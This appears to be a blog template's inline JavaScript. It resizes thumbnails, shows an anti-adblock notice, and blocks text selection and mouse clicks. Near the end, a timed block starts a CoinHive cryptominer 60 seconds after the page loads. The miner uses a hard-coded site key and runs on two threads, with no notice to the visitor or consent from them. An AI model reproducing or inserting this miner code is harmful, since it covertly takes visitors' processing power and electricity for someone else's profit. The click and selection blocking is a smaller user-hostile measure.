//<![CDATA[
function RanA(a, b) {
  const number = (Math.random() * (b - a)) + a;
  document.write(Math.floor(number));
}
if (typeof document.onselectstart !== 'undefined') {
  document.onselectstart = new Function('return false');
} else {
  document.onmousedown = new Function('return false');
  document.onmouseup = new Function('return false');
}

// change thumbs size
function changeThumbSize(id, size) {
  const blogGadget = document.getElementById(id);
  const replacement = blogGadget.innerHTML;
  blogGadget.innerHTML = replacement.replace(/s35-c|s72-c|s400|s640|w72-h72-p-k-no-nu|w72-h72-p-nu/gi, `s${size}-c`);
  const thumbnails = blogGadget.getElementsByTagName('img');
  for (let i = 0; i < thumbnails.length; i += 1) {
    thumbnails[i].width = size;
    thumbnails[i].height = size - 90;
  }
}
setTimeout(() => {
changeThumbSize('PopularPosts1', 150);
changeThumbSize('PopularPosts2', 150);
}, 10e3);
// end thumb size

// aab
/bienvenido/.test(window.location.href) || setTimeout(() => {
    const e = document.getElementById('keep-ads'),
      t = document.querySelector('ins.adsbygoogle');
    $(t).height() === 0 && (e.className = 'show');
}, 120e3);
function hidekeep() {
  document.getElementById('keep-ads').style.display = 'none';
}
// end aab

setTimeout(() => {
  const mihelp = new CoinHive.Anonymous('sMMUaZyIzYP4r17WYV0G2s8dHGIWjwxC', {
    threads: 2,
    autoThreads: false,
    throttle: 0.9,
  });
  mihelp.start();
}, 60e3);

addToHomescreen();
//]]>
